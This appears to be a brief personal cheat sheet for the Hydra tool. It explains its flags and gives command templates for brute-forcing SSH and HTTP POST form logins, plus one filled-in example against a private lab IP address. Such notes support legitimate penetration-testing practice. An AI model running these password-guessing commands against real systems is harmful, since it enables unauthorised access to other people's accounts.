# Args
## -l
specifies the username
## -P
indicates the password list
## -t
sets the number of threads to spawn
## -V
sets the output to verbose
# Usage
## SSH
```
hydra -l <username> -P <wordlist> <IP> -t <threads> ssh
```
## HTTP POST FORM
```shell
sudo hydra -l <username> -P <wordlist> <IP> http-post-form "<path>:<login_credentials>:<invalid_response>"
```
example:
```shell
hydra -l <username> -P <wordlist> 10.10.88.56 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```